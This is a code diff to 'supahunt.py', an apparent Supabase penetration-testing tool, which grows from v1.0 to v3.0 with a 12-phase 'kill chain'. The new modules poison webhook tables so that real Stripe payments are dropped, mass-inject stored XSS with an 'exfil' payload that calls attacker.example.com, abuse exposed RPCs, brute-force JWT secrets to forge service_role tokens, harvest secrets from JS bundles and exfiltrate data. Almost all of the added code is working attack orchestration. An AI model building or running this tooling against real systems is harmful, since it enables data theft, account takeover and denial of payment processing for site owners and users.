@@ -10,7 +10,7 @@
 ║   ╚══════╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝  ║
 ║                                                                   ║
 ║   Supabase Security Auditing & Penetration Testing Framework      ║
-║   v1.0 — For authorized security testing only                     ║
+║   v3.0 — For authorized security testing only                     ║
 ║                                                                   ║
 ╚═══════════════════════════════════════════════════════════════════╝
 
@@ -20,7 +20,11 @@ Usage:
     supahunt.py enum <url> [options]            Enumerate tables, RPCs, storage
     supahunt.py exploit <url> [options]         Run exploitation modules
     supahunt.py exfil <url> [options]           Mass data exfiltration
-    supahunt.py full <url> [options]            Full kill chain (discover→exploit→report)
+    supahunt.py webhook <url> [options]         Webhook idempotency poisoning
+    supahunt.py reviews <url> [options]         Mass XSS review/comment injection
+    supahunt.py rpc-abuse <url> [options]       Probe & exploit exposed RPCs
+    supahunt.py forge <url> [options]           Token forgery (JWT, HMAC, ad tokens)
+    supahunt.py full <url> [options]            Full kill chain v3 (12 phases)
 
 Options:
     --supabase-url URL       Supabase URL (skip auto-discovery)
@@ -58,9 +62,17 @@ from rich import box
 # Local modules
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 from modules.discovery import Discovery, SupabaseTarget, decode_jwt_payload
+from modules.discovery_v2 import DiscoveryV2
 from modules.enumerator import Enumerator
 from modules.exploiter import AuthExploiter, DataExploiter, RPCExploiter, PersistenceExploiter, ProfileExploiter
+from modules.graphql_tester import GraphQLMutationTester
+from modules.storage_exploiter import StorageExploiter
+from modules.filter_injection import FilterInjectionTester
 from modules.reporter import ScanReport, Finding
+from modules.webhook_poisoner import WebhookPoisoner
+from modules.review_injector import ReviewInjector
+from modules.rpc_abuser import RPCAbuser
+from modules.token_forger import TokenForger
 
 console = Console()
 
@@ -71,7 +83,7 @@ BANNER = """[bold red]
  ╚════██║██║   ██║██╔═══╝ ██╔══██║██╔══██║██║   ██║██║╚██╗██║   ██║
  ███████║╚██████╔╝██║     ██║  ██║██║  ██║╚██████╔╝██║ ╚████║   ██║
  ╚══════╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝[/]
-[dim]Supabase Security Auditing & Penetration Testing Framework v1.0[/]
+[dim]Supabase Security Auditing & Penetration Testing Framework v3.0[/]
 [dim]For authorized security testing only[/]
 """
 
@@ -529,6 +541,295 @@ def cmd_exploit(args, target: SupabaseTarget = None, report: ScanReport = None):
     return target, report, token
 
 
+def cmd_graphql_test(args, target: SupabaseTarget = None, report: ScanReport = None,
+                     token: str = None):
+    """Test all GraphQL mutations for RLS bypass."""
+    if not target:
+        target = cmd_discover(args)
+    if not report:
+        report = ScanReport(args.url, target.to_dict())
+    token = token or args.token
+
+    console.print("\n[bold cyan]═══ GRAPHQL MUTATION RLS TESTING ═══[/]\n")
+
+    tester = GraphQLMutationTester(
+        target, console=console, timeout=args.timeout, proxy=args.proxy,
+        threads=args.threads,
+    )
+
+    with Progress(
+        SpinnerColumn(),
+        TextColumn("[progress.description]{task.description}"),
+        BarColumn(),
+        TextColumn("{task.completed}/{task.total}"),
+        console=console,
+    ) as progress:
+        task = progress.add_task("Testing mutations", total=1)
+
+        def on_progress(done, total, result):
+            progress.update(task, total=total, completed=done,
+                            description=f"Testing: {result.table}")
+
+        results = tester.test_all_mutations(
+            token=token,
+            progress_callback=on_progress,
+        )
+
+    summary = results["summary"]
+
+    # Print summary table
+    table = Table(title="GraphQL Mutation RLS Audit", box=box.ROUNDED)
+    table.add_column("Metric", style="cyan")
+    table.add_column("Value", justify="right")
+    table.add_row("Total tested", str(summary["total_tested"]))
+    table.add_row("[bold red]RLS bypass[/]", str(summary["rls_bypass"]))
+    table.add_row("[yellow]Constraint-only block[/]", str(summary["constraint_block"]))
+    table.add_row("[green]RLS blocked[/]", str(summary["rls_block"]))
+    table.add_row("Errors/Skipped", str(summary["errors"] + summary["skipped"]))
+    table.add_row("[bold]RLS coverage[/]", f"{summary['rls_coverage_pct']}%")
+    table.add_row("[bold red]Bypass rate[/]", f"{summary['bypass_pct']}%")
+    console.print(table)
+
+    if summary["bypass_tables"]:
+        console.print(f"\n[bold red]INSERT bypass tables:[/] {', '.join(summary['bypass_tables'])}")
+
+    # Generate findings
+    for r in results["insert"]:
+        if r.is_bypass:
+            report.add_finding(
+                title=f"GraphQL INSERT bypass: {r.table}",
+                severity="CRITICAL",
+                category="GraphQL RLS",
+                description=f"INSERT into {r.table} succeeded via GraphQL without authorization. "
+                            f"{r.affected_count} row(s) created.",
+                remediation="Add RLS INSERT policy on this table.",
+                cvss=9.1,
+            )
+        elif r.is_constraint_only:
+            report.add_finding(
+                title=f"GraphQL INSERT constraint-only block: {r.table}",
+                severity="HIGH",
+                category="GraphQL RLS",
+                description=f"INSERT into {r.table} passed RLS but was blocked by "
+                            f"database constraint: {r.error_message[:100]}. "
+                            f"With valid reference values, this INSERT would succeed.",
+                remediation="Add RLS INSERT policy — constraint is not a security control.",
+            )
+
+    for op in ("update", "delete"):
+        for r in results[op]:
+            if r.is_bypass:
+                report.add_finding(
+                    title=f"GraphQL {r.operation} accessible: {r.table}",
+                    severity="HIGH",
+                    category="GraphQL RLS",
+                    description=f"{r.operation} mutation on {r.table} is accepted "
+                                f"without RLS blocking.",
+                    remediation=f"Add RLS {r.operation} policy on this table.",
+                )
+
+    report.add_finding(
+        title=f"GraphQL RLS coverage: {summary['rls_coverage_pct']}% "
+              f"({summary['rls_block']}/{summary['total_tested']})",
+        severity="CRITICAL" if summary["bypass_pct"] > 50 else
+                 "HIGH" if summary["bypass_pct"] > 20 else "MEDIUM",
+        category="GraphQL RLS",
+        description=f"{summary['bypass_pct']}% of mutations bypass RLS. "
+                    f"{summary['insert_bypass_count']} INSERT, "
+                    f"{summary['update_bypass_count']} UPDATE, "
+                    f"{summary['delete_bypass_count']} DELETE bypasses.",
+    )
+
+    # Cleanup test rows
+    if not args.no_cleanup:
+        tester.cleanup_created_rows(results, token)
+
+    return target, report, token, results
+
+
+def cmd_storage_audit(args, target: SupabaseTarget = None,
+                      report: ScanReport = None, token: str = None):
+    """Audit all storage buckets for misconfigurations."""
+    if not target:
+        target = cmd_discover(args)
+    if not report:
+        report = ScanReport(args.url, target.to_dict())
+    token = token or args.token
+
+    console.print("\n[bold cyan]═══ STORAGE SECURITY AUDIT ═══[/]\n")
+
+    storage = StorageExploiter(
+        target, console=console, timeout=args.timeout, proxy=args.proxy,
+    )
+
+    buckets = storage.audit_all_buckets(token=token)
+
+    # Print results
+    table = Table(title=f"Storage Buckets ({len(buckets)})", box=box.ROUNDED)
+    table.add_column("Bucket", style="cyan", width=20)
+    table.add_column("Public", justify="center", width=8)
+    table.add_column("Files", justify="right", width=8)
+    table.add_column("Upload", justify="center", width=8)
+    table.add_column("MIME Bypass", justify="center", width=12)
+    table.add_column("SVG XSS", justify="center", width=10)
+
+    for b in buckets:
+        mime_bypasses = sum(1 for v in b.mime_bypass_results.values()
+                           if v.get("bypass"))
+        xss_uploaded = any(v.get("uploaded") for v in b.xss_results.values())
+
+        table.add_row(
+            b.name,
+            "[green]YES[/]" if b.public else "[dim]no[/]",
+            str(b.file_count),
+            "[bold red]YES[/]" if b.upload_allowed else "[green]no[/]",
+            f"[bold red]{mime_bypasses}[/]" if mime_bypasses else "[green]0[/]",
+            "[bold red]YES[/]" if xss_uploaded else "[green]no[/]",
+        )
+
+    console.print(table)
+
+    # Generate findings
+    for b in buckets:
+        if b.upload_allowed:
+            report.add_finding(
+                title=f"Storage bucket '{b.name}' allows upload",
+                severity="HIGH",
+                category="Storage",
+                description=f"Bucket {b.name} accepts file uploads.",
+            )
+
+        mime_bypasses = {k: v for k, v in b.mime_bypass_results.items()
+                        if v.get("bypass")}
+        if mime_bypasses:
+            report.add_finding(
+                title=f"MIME type bypass on bucket '{b.name}'",
+                severity="HIGH",
+                category="Storage",
+                description=f"MIME validation can be bypassed: "
+                            f"{', '.join(mime_bypasses.keys())}",
+                evidence=json.dumps(mime_bypasses, indent=2),
+                remediation="Validate file content (magic bytes), not just Content-Type header.",
+            )
+
+        xss_results = {k: v for k, v in b.xss_results.items()
+                       if v.get("uploaded")}
+        if xss_results:
+            executable = any(v.get("xss_executable") for v in xss_results.values())
+            report.add_finding(
+                title=f"SVG XSS upload on bucket '{b.name}'",
+                severity="CRITICAL" if executable else "HIGH",
+                category="Storage XSS",
+                description=f"SVG file with JavaScript uploaded successfully. "
+                            f"{'XSS is EXECUTABLE (no CSP)!' if executable else 'CSP may mitigate.'}",
+                remediation="Block SVG uploads or add Content-Security-Policy header.",
+                cvss=8.1 if executable else 5.4,
+            )
+
+    # Cleanup
+    if not args.no_cleanup:
+        storage.cleanup(token)
+
+    return target, report, token
+
+
+def cmd_filter_test(args, target: SupabaseTarget = None,
+                    tables: list = None, report: ScanReport = None,
+                    token: str = None):
+    """Test PostgREST filter injection on all tables."""
+    if not target:
+        target = cmd_discover(args)
+    if not report:
+        report = ScanReport(args.url, target.to_dict())
+    token = token or args.token
+
+    console.print("\n[bold cyan]═══ POSTGREST FILTER INJECTION ═══[/]\n")
+
+    tester = FilterInjectionTester(
+        target, console=console, timeout=args.timeout, proxy=args.proxy,
+    )
+
+    # If no tables provided, enumerate first
+    if not tables:
+        enum = Enumerator(target, console=console, timeout=args.timeout,
+                          proxy=args.proxy, threads=args.threads)
+        tables = enum.enumerate_tables(token=token)
+
+    # Filter to readable tables with data
+    testable = [t for t in tables if t.select_allowed and (t.record_count or 0) > 0]
+    console.print(f"  Testing {len(testable)} tables with data...")
+
+    results = tester.test_all_tables(testable, token)
+
+    # Also test app-level API routes
+    if args.url:
+        console.print("\n[bold cyan]═══ API ROUTE INJECTION ═══[/]\n")
+        api_results = tester.test_api_route_injection(args.url)
+        results.extend(api_results)
+
+    # Generate findings
+    for r in results:
+        if r.vulnerable:
+            report.add_finding(
+                title=f"Filter injection: {r.table}.{r.param} via {r.vector}",
+                severity=r.severity,
+                category="Filter Injection",
+                description=f"PostgREST filter injection on {r.table} via "
+                            f"parameter '{r.param}'. {r.evidence}",
+                remediation="Sanitize user input before passing to PostgREST filters. "
+                            "Use parameterized queries in Edge Functions.",
+                cvss=7.5 if r.severity == "HIGH" else 5.3,
+            )
+
+    return target, report, token
+
+
+def cmd_discover_v2(args):
+    """Enhanced discovery with source maps, API probing, secrets."""
+    print_banner()
+    disc = DiscoveryV2(console=console, timeout=args.timeout, proxy=args.proxy)
+
+    if args.supabase_url and args.anon_key:
+        # Skip full discovery, just build target
+        target_result = disc.discover(args.url, deep=True)
+    else:
+        target_result = disc.discover(args.url, deep=True)
+
+    target = target_result["target"]
+
+    if args.supabase_url:
+        target.supabase_url = args.supabase_url
+        target.project_ref = args.supabase_url.split("//")[1].split(".")[0]
+        target.rest_url = f"{target.supabase_url}/rest/v1"
+        target.graphql_url = f"{target.supabase_url}/graphql/v1"
+        target.auth_url = f"{target.supabase_url}/auth/v1"
+        target.storage_url = f"{target.supabase_url}/storage/v1"
+    if args.anon_key:
+        target.anon_key = args.anon_key
+
+    print_target_info(target)
+
+    # Print extra findings
+    if target_result["secrets_found"]:
+        console.print(f"\n[bold red][!] {len(target_result['secrets_found'])} secrets found in JS bundles[/]")
+        for stype, sval in target_result["secrets_found"]:
+            console.print(f"  [red]{stype}[/]: {sval}")
+
+    if target_result["source_maps"]:
+        console.print(f"\n[bold red][!] {len(target_result['source_maps'])} source maps exposed[/]")
+
+    if target_result["extra_supabase_projects"]:
+        console.print(f"\n[bold yellow][!] {len(target_result['extra_supabase_projects'])} extra Supabase projects[/]")
+        for p in target_result["extra_supabase_projects"]:
+            console.print(f"  {p['ref']}: {p['url']}")
+
+    if target_result["api_routes"]:
+        accessible = [r for r in target_result["api_routes"] if r.get("status") == 200]
+        console.print(f"\n[bold cyan][*] {len(accessible)} accessible API routes found[/]")
+
+    return target, target_result
+
+
 def cmd_exfil(args, target: SupabaseTarget = None, tables: list = None,
               token: str = None, report: ScanReport = None):
     """Mass data exfiltration."""
@@ -596,22 +897,304 @@ def cmd_exfil(args, target: SupabaseTarget = None, tables: list = None,
     return report
 
 
+def cmd_webhook(args, target: SupabaseTarget = None, report: ScanReport = None,
+                 token: str = None):
+    """Webhook idempotency poisoning — block real Stripe payments."""
+    if not target:
+        target = cmd_discover(args)
+    if not report:
+        report = ScanReport(args.url, target.to_dict())
+    token = token or args.token
+
+    console.print("\n[bold cyan]═══ WEBHOOK IDEMPOTENCY POISONING ═══[/]\n")
+
+    poisoner = WebhookPoisoner(
+        target, console=console, timeout=args.timeout, proxy=args.proxy,
+    )
+
+    # 1. Find webhook table
+    table = poisoner.find_webhook_table(token)
+    if not table:
+        console.print("[yellow]No webhook table found — skipping[/]")
+        return target, report, token
+
+    # 2. Get schema
+    schema = poisoner.get_table_schema(token)
+    if schema:
+        console.print(f"  Schema: {[f['name'] for f in schema]}")
+
+    # 3. Poison via GraphQL
+    events_per_type = getattr(args, "events_per_type", 100)
+    results = poisoner.poison_via_graphql(
+        events_per_type=events_per_type, token=token,
+    )
+
+    if results.get("total", 0) == 0:
+        # Fallback to REST
+        console.print("  [yellow]GraphQL failed, trying REST...[/]")
+        results = poisoner.poison_via_rest(
+            events_per_type=events_per_type, token=token,
+        )
+
+    # 4. Verify
+    verify = poisoner.verify_poisoning(token)
+
+    provider = results.get("provider", "unknown")
+    if results.get("total", 0) > 0:
+        report.add_finding(
+            title=f"Webhook idempotency poisoning: {results['total']} fake events injected",
+            severity="CRITICAL",
+            category="Payment Security",
+            description=f"Injected {results['total']} fake {provider} event IDs into "
+                        f"'{table}'. Real payment webhooks matching these IDs will "
+                        f"be silently dropped, blocking subscription activations, "
+                        f"invoice processing, and refunds.",
+            evidence=json.dumps(results, indent=2),
+            impact="Complete denial of payment processing. Users who pay will "
+                   "never receive their subscriptions or purchases.",
+            remediation="Add RLS policies to webhook tables. Restrict INSERT to "
+                        "service_role only.",
+            cvss=9.8,
+        )
+
+    # 5. Cleanup unless --no-cleanup
+    if not args.no_cleanup:
+        cleaned = poisoner.cleanup(token)
+        console.print(f"  [green]Cleaned up {cleaned} records[/]")
+
+    return target, report, token
+
+
+def cmd_reviews(args, target: SupabaseTarget = None, report: ScanReport = None,
+                token: str = None):
+    """Mass XSS review/comment injection across content catalog."""
+    if not target:
+        target = cmd_discover(args)
+    if not report:
+        report = ScanReport(args.url, target.to_dict())
+    token = token or args.token
+
+    console.print("\n[bold cyan]═══ MASS REVIEW/XSS INJECTION ═══[/]\n")
+
+    injector = ReviewInjector(
+        target, console=console, timeout=args.timeout, proxy=args.proxy,
+    )
+
+    # Auto-discover + inject (fully adaptive to any schema)
+    user_id = getattr(args, "user_id", None) or "00000000-0000-0000-0000-000000000000"
+    payload = getattr(args, "xss_payload", "exfil")
+    callback = getattr(args, "callback_url", "https://attacker.example.com")
+    signature = getattr(args, "signature", "supahunt")
+
+    results = injector.auto_inject(
+        token=token,
+        payload_name=payload,
+        callback_url=callback,
+        user_id=user_id,
+        signature=signature,
+    )
+
+    if "error" in results:
+        console.print(f"[yellow]{results['error']} — skipping[/]")
+        return target, report, token
+
+    # Count results
+    total_injected = sum(
+        r.get("total", 0) for r in results.get("injections", {}).values()
+    )
+    content_tables = list(results.get("discovery", {}).get("content_tables", {}).keys())
+
+    if total_injected > 0:
+        report.add_finding(
+            title=f"Mass XSS injection: {total_injected} records across catalog",
+            severity="CRITICAL",
+            category="Stored XSS",
+            description=f"Injected {total_injected} XSS entries via GraphQL "
+                        f"INSERT mutation with zero RLS. Content targeted: "
+                        f"{', '.join(content_tables)}.",
+            evidence=json.dumps(results, indent=2, default=str),
+            impact="Stored XSS executes for every user viewing affected content. "
+                   "Can steal session tokens, cookies, and perform actions as victim.",
+            remediation="Add RLS INSERT policies requiring authenticated user_id match. "
+                        "Sanitize HTML in user-generated content server-side.",
+            cvss=9.6,
+        )
+
+    # Save injected IDs for later cleanup
+    output_dir = os.path.join(args.output, "reviews")
+    os.makedirs(output_dir, exist_ok=True)
+    id_file = os.path.join(output_dir, "injected_ids.json")
+    injector.save_injected(id_file)
+
+    # Cleanup unless --no-cleanup
+    if not args.no_cleanup:
+        cleaned = injector.cleanup(token)
+        console.print(f"  [green]Cleaned up {cleaned} records[/]")
+
+    return target, report, token
+
+
+def cmd_rpc_abuse(args, target: SupabaseTarget = None, report: ScanReport = None,
+                  token: str = None):
+    """Auto-discover and exploit exposed RPC functions."""
+    if not target:
+        target = cmd_discover(args)
+    if not report:
+        report = ScanReport(args.url, target.to_dict())
+    token = token or args.token
+
+    console.print("\n[bold cyan]═══ RPC ABUSE TESTING ═══[/]\n")
+
+    abuser = RPCAbuser(
+        target, console=console, timeout=args.timeout, proxy=args.proxy,
+    )
+
+    # 1. Auto-discover + classify + probe all RPCs
+    results = abuser.probe_all(token=token, anon_only=(token is None))
+
+    summary = abuser.summary
+    console.print(f"\n  [bold]Discovered: {summary['total_probed']}[/]")
+    console.print(f"  [bold red]Callable: {summary['callable_count']}[/]")
+    console.print(f"  [green]Patched: {summary['patched_count']}[/]")
+
+    # 2. Generate findings per callable RPC
+    for category, rpcs in results.items():
+        for rpc in rpcs:
+            if rpc.get("callable"):
+                report.add_finding(
+                    title=f"RPC '{rpc['name']}' callable without auth",
+                    severity=rpc["severity"],
+                    category=f"RPC Abuse — {category}",
+                    description=rpc["impact"],
+                    evidence=f"HTTP {rpc['status']}: {rpc['response'][:200]}",
+                    remediation="Add SECURITY INVOKER or explicit role check. "
+                                "Restrict to service_role.",
+                    cvss=9.8 if rpc["severity"] == "CRITICAL" else 7.5,
+                )
+
+    # 3. Test dynamic attack chains by category
+    if summary["callable_count"] >= 2:
+        console.print("\n  [bold red]Testing attack chains by category...[/]")
+        for category in results.keys():
+            callable_in_cat = [
+                r for r in results[category] if r.get("callable")
+            ]
+            if len(callable_in_cat) >= 2:
+                chain_result = abuser.execute_chain(
+                    category=category, token=token,
+                )
+                if chain_result.get("executions"):
+                    exec_count = sum(
+                        len(e) for e in chain_result["executions"]
+                    )
+                    console.print(
+                        f"  Chain '{category}': {exec_count} RPCs executed"
+                    )
+
+    return target, report, token
+
+
+def cmd_forge(args, target: SupabaseTarget = None, report: ScanReport = None,
+              token: str = None):
+    """Token forgery — JWT bruteforce, HMAC token forging, ad event injection."""
+    if not target:
+        target = cmd_discover(args)
+    if not report:
+        report = ScanReport(args.url, target.to_dict())
+    token = token or args.token
+
+    console.print("\n[bold cyan]═══ TOKEN FORGERY ═══[/]\n")
+
+    forger = TokenForger(
+        target, console=console, timeout=args.timeout, proxy=args.proxy,
+    )
+
+    # 1. JWT secret bruteforce
+    console.print("  [bold]Phase 1: JWT Secret Bruteforce[/]")
+    wordlist = None
+    wordlist_path = getattr(args, "jwt_wordlist", None)
+    if wordlist_path:
+        wordlist = forger.load_wordlist(wordlist_path)
+        console.print(f"  Loaded {len(wordlist)} candidates from {wordlist_path}")
+    jwt_secret = forger.bruteforce_jwt_secret(wordlist=wordlist)
+
+    if jwt_secret:
+        report.add_finding(
+            title=f"JWT secret cracked: {jwt_secret[:20]}...",
+            severity="CRITICAL",
+            category="Authentication",
+            description=f"Supabase JWT signing secret matches a common/default value. "
+                        f"Attacker can forge service_role tokens for FULL database access.",
+            impact="Complete bypass of all Row Level Security. Full read/write/delete "
+                   "access to every table including auth.users.",
+            remediation="Rotate JWT secret immediately. Use a strong random value "
+                        "(min 32 bytes). Invalidate all existing tokens.",
+            cvss=10.0,
+        )
+
+        # 2. Forge service_role JWT
+        console.print("  [bold]Phase 2: Forging service_role JWT[/]")
+        forged = forger.forge_service_role_jwt(jwt_secret)
+        if forged:
+            verify = forger.verify_forged_jwt(forged)
+            if verify.get("verified"):
+                report.add_finding(
+                    title="Forged service_role JWT VERIFIED — full DB access",
+                    severity="CRITICAL",
+                    category="Authentication",
+                    description="A forged service_role JWT was accepted by the API. "
+                                "Complete database access confirmed.",
+                    evidence=f"JWT: {forged[:60]}...\nSample data: "
+                             f"{json.dumps(verify.get('sample_data', []), indent=2)}",
+                    cvss=10.0,
+                )
+                console.print("  [bold red on white] SERVICE_ROLE JWT VERIFIED [/]")
+    else:
+        console.print("  [dim]JWT secret not in default wordlist[/]")
+
+    # 3. HMAC token forgery (if a secret was provided via --ad-secret)
+    hmac_secret = getattr(args, "ad_secret", None)
+    if hmac_secret:
+        forger.add_secret("hmac_secret", hmac_secret)
+
+        console.print("  [bold]Phase 3: HMAC Token Forgery[/]")
+        test_token = forger.forge_api_token(
+            hmac_secret, {"test_param": "test_value"},
+        )
+        if test_token:
+            report.add_finding(
+                title="HMAC API tokens forgeable with discovered secret",
+                severity="HIGH",
+                category="Token Forgery",
+                description="API tokens can be forged using a hardcoded or weak "
+                            "secret found in client-side source code.",
+                impact="Token-protected endpoints can be called with forged tokens. "
+                       "Enables analytics manipulation, fake events, etc.",
+                remediation="Move token secret to server-side env variable. "
+                            "Rotate the secret immediately.",
+                cvss=7.5,
+            )
+
+    return target, report, token
+
+
 def cmd_full(args):
-    """Full kill chain: discover → enumerate → exploit → exfil → report."""
+    """Full kill chain: discover → enumerate → exploit → graphql → storage → filter → exfil → report."""
     print_banner()
 
     console.print(Panel(
-        "[bold]Full Kill Chain Mode[/]\n"
-        "discover → enumerate → exploit → exfil → report",
+        "[bold]Full Kill Chain Mode v3.0[/]\n"
+        "discover → enum → exploit → graphql → storage → filters → exfil\n"
+        "→ webhook-poison → review-xss → rpc-abuse → token-forge → report",
         title="[bold red]FULL SCAN[/]",
         box=box.DOUBLE,
     ))
 
     start = time.time()
 
-    # 1. Discovery
-    console.print("\n[bold white on blue] PHASE 1: DISCOVERY [/]\n")
-    target = cmd_discover(args)
+    # 1. Discovery (v2)
+    console.print("\n[bold white on blue] PHASE 1: DISCOVERY (v2) [/]\n")
+    target, discovery_result = cmd_discover_v2(args)
 
     if not target.supabase_url or not target.anon_key:
         console.print("[bold red][!] Discovery failed. Aborting.[/]")
@@ -621,23 +1204,113 @@ def cmd_full(args):
     console.print("\n[bold white on blue] PHASE 2: ENUMERATION [/]\n")
     target, tables, rpcs, report = cmd_enum(args, target)
 
-    # 3. Exploitation (unless --no-exploit)
+    # Add discovery findings to report
+    if discovery_result.get("secrets_found"):
+        for stype, sval in discovery_result["secrets_found"]:
+            report.add_finding(
+                title=f"Secret leaked in JS: {stype}",
+                severity="CRITICAL",
+                category="Secret Exposure",
+                description=f"{stype} found in client-side JavaScript bundle.",
+                evidence=sval,
+                remediation="Move secret to server-side environment variable.",
+                cvss=9.0,
+            )
+    if discovery_result.get("source_maps"):
+        report.add_finding(
+            title=f"{len(discovery_result['source_maps'])} source maps exposed",
+            severity="HIGH",
+            category="Information Disclosure",
+            description="JavaScript source maps are publicly accessible, "
+                        "exposing full application source code.",
+            remediation="Remove .map files from production or restrict access.",
+        )
+    if discovery_result.get("extra_supabase_projects"):
+        for p in discovery_result["extra_supabase_projects"]:
+            report.add_finding(
+                title=f"Extra Supabase project: {p['ref']}",
+                severity="MEDIUM",
+                category="Information Disclosure",
+                description=f"Additional Supabase project credentials found: {p['url']}",
+            )
+
+    # 3. Auth exploitation (unless --no-exploit)
     token = args.token
     if not args.no_exploit:
-        console.print("\n[bold white on blue] PHASE 3: EXPLOITATION [/]\n")
+        console.print("\n[bold white on blue] PHASE 3: AUTH EXPLOITATION [/]\n")
         target, report, token = cmd_exploit(args, target, report)
     else:
         console.print("\n[dim]Skipping exploitation (--no-exploit)[/]")
 
-    # 4. Exfiltration (unless --no-exfil)
+    # 4. GraphQL mutation RLS testing
+    if not args.no_exploit:
+        console.print("\n[bold white on blue] PHASE 4: GRAPHQL MUTATION RLS [/]\n")
+        try:
+            target, report, token, gql_results = cmd_graphql_test(
+                args, target, report, token
+            )
+        except Exception as e:
+            console.print(f"[red]GraphQL testing error: {e}[/]")
+
+    # 5. Storage audit
+    if not args.no_exploit:
+        console.print("\n[bold white on blue] PHASE 5: STORAGE AUDIT [/]\n")
+        try:
+            target, report, token = cmd_storage_audit(args, target, report, token)
+        except Exception as e:
+            console.print(f"[red]Storage audit error: {e}[/]")
+
+    # 6. Filter injection
+    if not args.no_exploit and tables:
+        console.print("\n[bold white on blue] PHASE 6: FILTER INJECTION [/]\n")
+        try:
+            target, report, token = cmd_filter_test(
+                args, target, tables, report, token
+            )
+        except Exception as e:
+            console.print(f"[red]Filter injection error: {e}[/]")
+
+    # 7. Exfiltration (unless --no-exfil)
     if not args.no_exfil and tables:
-        console.print("\n[bold white on blue] PHASE 4: EXFILTRATION [/]\n")
+        console.print("\n[bold white on blue] PHASE 7: EXFILTRATION [/]\n")
         report = cmd_exfil(args, target, tables, token, report)
     else:
         console.print("\n[dim]Skipping exfiltration (--no-exfil)[/]")
 
-    # 5. Report
-    console.print("\n[bold white on blue] PHASE 5: REPORT [/]\n")
+    # 8. Webhook poisoning
+    if not args.no_exploit:
+        console.print("\n[bold white on blue] PHASE 8: WEBHOOK POISONING [/]\n")
+        try:
+            target, report, token = cmd_webhook(args, target, report, token)
+        except Exception as e:
+            console.print(f"[red]Webhook poisoning error: {e}[/]")
+
+    # 9. Review/XSS injection
+    if not args.no_exploit:
+        console.print("\n[bold white on blue] PHASE 9: REVIEW/XSS INJECTION [/]\n")
+        try:
+            target, report, token = cmd_reviews(args, target, report, token)
+        except Exception as e:
+            console.print(f"[red]Review injection error: {e}[/]")
+
+    # 10. RPC abuse
+    if not args.no_exploit:
+        console.print("\n[bold white on blue] PHASE 10: RPC ABUSE [/]\n")
+        try:
+            target, report, token = cmd_rpc_abuse(args, target, report, token)
+        except Exception as e:
+            console.print(f"[red]RPC abuse error: {e}[/]")
+
+    # 11. Token forgery
+    if not args.no_exploit:
+        console.print("\n[bold white on blue] PHASE 11: TOKEN FORGERY [/]\n")
+        try:
+            target, report, token = cmd_forge(args, target, report, token)
+        except Exception as e:
+            console.print(f"[red]Token forgery error: {e}[/]")
+
+    # 12. Report
+    console.print("\n[bold white on blue] PHASE 12: REPORT [/]\n")
     md_path, json_path = report.save(args.output)
 
     elapsed = time.time() - start
@@ -690,15 +1363,49 @@ def build_parser():
     common.add_argument("--tables", help="Extra table names (comma-separated)")
     common.add_argument("--no-exploit", action="store_true", help="Skip exploitation")
     common.add_argument("--no-exfil", action="store_true", help="Skip exfiltration")
+    common.add_argument("--no-cleanup", action="store_true", help="Keep test artifacts (don't clean up)")
     common.add_argument("--quiet", action="store_true", help="Minimal output")
     common.add_argument("--json", action="store_true", help="JSON output only")
+    common.add_argument("--rate-limit", type=float, default=10.0,
+                        help="Max requests/sec (default: 10)")
 
     sub.add_parser("discover", parents=[common], help="Auto-detect Supabase from URL")
+    sub.add_parser("discover2", parents=[common], help="Enhanced discovery (v2: source maps, API probing, secrets)")
     sub.add_parser("scan", parents=[common], help="Recon scan (no exploitation)")
     sub.add_parser("enum", parents=[common], help="Enumerate tables, RPCs, storage")
     sub.add_parser("exploit", parents=[common], help="Run exploitation modules")
+    sub.add_parser("graphql", parents=[common], help="GraphQL mutation RLS audit")
+    sub.add_parser("storage", parents=[common], help="Storage bucket security audit")
+    sub.add_parser("filters", parents=[common], help="PostgREST filter injection testing")
     sub.add_parser("exfil", parents=[common], help="Mass data exfiltration")
-    sub.add_parser("full", parents=[common], help="Full kill chain")
+
+    # v2 attack modules
+    webhook_p = sub.add_parser("webhook", parents=[common],
+                               help="Webhook idempotency poisoning (Stripe)")
+    webhook_p.add_argument("--events-per-type", type=int, default=100,
+                           help="Fake events per Stripe event type (default: 100)")
+
+    reviews_p = sub.add_parser("reviews", parents=[common],
+                               help="Mass XSS review/comment injection")
+    reviews_p.add_argument("--user-id", help="User ID for review injection")
+    reviews_p.add_argument("--xss-payload",
+                           choices=["minimal", "exfil", "session_steal",
+                                    "defacement", "polyglot"],
+                           default="exfil", help="XSS payload template")
+    reviews_p.add_argument("--callback-url", default="https://attacker.example.com",
+                           help="Callback URL for XSS exfiltration")
+    reviews_p.add_argument("--signature", default="supahunt",
+                           help="Signature tag on injected reviews")
+
+    sub.add_parser("rpc-abuse", parents=[common],
+                   help="Probe & exploit exposed admin RPCs")
+
+    forge_p = sub.add_parser("forge", parents=[common],
+                             help="Token forgery (JWT bruteforce, HMAC tokens)")
+    forge_p.add_argument("--ad-secret", help="Known ad event token secret")
+    forge_p.add_argument("--jwt-wordlist", help="Custom JWT secret wordlist file")
+
+    sub.add_parser("full", parents=[common], help="Full kill chain (v3)")
 
     return parser
 
@@ -714,10 +1421,18 @@ def main():
 
     commands = {
         "discover": lambda: cmd_discover(args),
+        "discover2": lambda: cmd_discover_v2(args),
         "scan": lambda: cmd_scan(args),
         "enum": lambda: cmd_enum(args),
         "exploit": lambda: cmd_exploit(args),
+        "graphql": lambda: cmd_graphql_test(args),
+        "storage": lambda: cmd_storage_audit(args),
+        "filters": lambda: cmd_filter_test(args),
         "exfil": lambda: cmd_exfil(args),
+        "webhook": lambda: cmd_webhook(args),
+        "reviews": lambda: cmd_reviews(args),
+        "rpc-abuse": lambda: cmd_rpc_abuse(args),
+        "forge": lambda: cmd_forge(args),
         "full": lambda: cmd_full(args),
     }
 
